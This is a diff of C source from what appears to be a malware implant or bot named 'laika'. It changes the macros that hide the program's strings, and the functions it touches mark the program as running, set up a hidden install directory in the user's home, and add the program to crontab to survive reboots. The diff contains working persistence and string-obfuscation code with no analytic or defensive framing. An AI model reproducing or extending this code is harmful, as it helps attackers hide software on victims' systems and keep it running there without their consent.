@@ -11,7 +11,6 @@
 #include "lsocket.h"
 #include "lerror.h"
 #include "lbox.h"
-#include "lboxconfig.h"
 #include "lmem.h"
 
 static int laikaB_lockFile;
@@ -23,7 +22,7 @@ bool laikaB_checkRoot() {
 
 /* mark that laika is currently running */
 void laikaB_markRunning() {
-    LAIKA_BOX_STARTVAR(char*, filePath, LAIKA_BOX_SKID(LAIKA_LIN_LOCK_FILE_KEY), LAIKA_LIN_LOCK_FILE_DATA);
+    LAIKA_BOX_SKID_START(char*, filePath, LAIKA_LIN_LOCK_FILE);
 
     /* create lock file */
     if ((laikaB_lockFile = open(filePath, O_RDWR | O_CREAT, 0666)) == -1)
@@ -34,7 +33,7 @@ void laikaB_markRunning() {
         LAIKA_ERROR("Failed to create file lock!\n");
 
     LAIKA_DEBUG("file lock created!\n");
-    LAIKA_BOX_ENDVAR(filePath);
+    LAIKA_BOX_SKID_END(filePath);
 }
 
 /* unmark that laika is currently running */
@@ -67,8 +66,8 @@ void getInstallPath(char *outPath, int pathSz) {
     }
 
     /* create install directory if it doesn't exist */
-    LAIKA_BOX_STARTVAR(char*, dirPath, LAIKA_BOX_SKID(LAIKA_LIN_INSTALL_DIR_KEY), LAIKA_LIN_INSTALL_DIR_DATA);
-    LAIKA_BOX_STARTVAR(char*, filePath, LAIKA_BOX_SKID(LAIKA_LIN_INSTALL_FILE_KEY), LAIKA_LIN_INSTALL_FILE_DATA);
+    LAIKA_BOX_SKID_START(char*, dirPath, LAIKA_LIN_INSTALL_DIR);
+    LAIKA_BOX_SKID_START(char*, filePath, LAIKA_LIN_INSTALL_FILE);
     snprintf(outPath, pathSz, "%s/%s", home, dirPath);
     if (stat(outPath, &st) == -1) {
         LAIKA_DEBUG("creating '%s'...\n", outPath);
@@ -76,8 +75,8 @@ void getInstallPath(char *outPath, int pathSz) {
     }
 
     snprintf(outPath, pathSz, "%s/%s/%s", home, dirPath, filePath);
-    LAIKA_BOX_ENDVAR(dirPath);
-    LAIKA_BOX_ENDVAR(filePath);
+    LAIKA_BOX_SKID_END(dirPath);
+    LAIKA_BOX_SKID_END(filePath);
 }
 
 bool checkPersistCron(char *path) {
@@ -101,7 +100,7 @@ bool checkPersistCron(char *path) {
 }
 
 void tryPersistCron(char *path) {
-    LAIKA_BOX_STARTVAR(char*, cronCMD, LAIKA_BOX_SKID(LAIKA_LIN_CRONTAB_ENTRY_KEY), LAIKA_LIN_CRONTAB_ENTRY_DATA);
+    LAIKA_BOX_SKID_START(char*, cronCMD, LAIKA_LIN_CRONTAB_ENTRY);
     char cmd[PATH_MAX + 128];
 
     /* should be 'safe enough' */
@@ -112,7 +111,7 @@ void tryPersistCron(char *path) {
         LAIKA_ERROR("failed to install '%s' to crontab!\n", path);
 
     LAIKA_DEBUG("Installed '%s' to crontab!\n", path);
-    LAIKA_BOX_ENDVAR(cronCMD);
+    LAIKA_BOX_SKID_END(cronCMD);
 }
 
 /* try to gain persistance on machine */
